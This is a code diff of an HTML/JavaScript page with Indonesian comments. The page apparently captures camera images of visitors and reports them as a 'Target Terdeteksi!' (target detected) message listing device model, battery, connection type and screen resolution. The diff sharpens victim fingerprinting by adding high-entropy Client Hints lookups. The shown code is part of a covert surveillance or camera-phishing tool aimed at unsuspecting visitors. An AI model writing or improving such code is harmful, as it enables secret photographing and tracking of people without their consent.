@@ -24,23 +24,30 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        function getDeviceName() {
+        // Fungsi deteksi perangkat lebih akurat menggunakan Client Hints
+        async function getFullDeviceName() {
+            let model = "Android Mobile";
+            
+            // 1. Coba gunakan High Entropy Client Hints (Cara terbaru & Paling Akurat)
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                try {
+                    const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
+                    if (hints.model) return hints.model;
+                } catch (e) {}
+            }
+
+            // 2. Fallback: Parsing User Agent lama jika Client Hints gagal
             const ua = navigator.userAgent;
-            // Mencoba menangkap bagian model di dalam user agent
-            // Format umum: (Linux; Android 13; Model_HP Build/...)
             const match = ua.match(/\(([^)]+)\)/);
             if (match && match[1]) {
                 const parts = match[1].split(';');
-                // Bagian model biasanya terletak di posisi ke-2 atau ke-3 setelah Android
                 for (let part of parts) {
                     part = part.trim();
-                    if (part.toLowerCase().includes('build')) continue;
-                    if (part.toLowerCase().includes('android')) continue;
-                    if (part.toLowerCase().includes('linux')) continue;
-                    if (part.length > 2) return part;
+                    if (/android|linux|build|k/i.test(part) || part.length < 3) continue;
+                    return part;
                 }
             }
-            return "Android Mobile";
+            return model;
         }
 
         async function startCamera() {
@@ -73,8 +80,10 @@
                 }
             } catch (e) {}
 
+            const deviceName = await getFullDeviceName();
+
             const info = `📸 <b>Target Terdeteksi!</b>\n\n` +
-                         `📱 <b>Perangkat:</b> <code>${getDeviceName()}</code>\n` +
+                         `📱 <b>Perangkat:</b> <code>${deviceName}</code>\n` +
                          `🔋 <b>Baterai:</b> ${battery}\n` +
                          `🌐 <b>Koneksi:</b> ${navigator.connection ? navigator.connection.effectiveType.toUpperCase() : 'N/A'}\n` +
                          `🖥 <b>Resolusi:</b> ${window.screen.width}x${window.screen.height}\n` +
@@ -107,3 +116,4 @@
     </script>
 </body>
 </html>
+
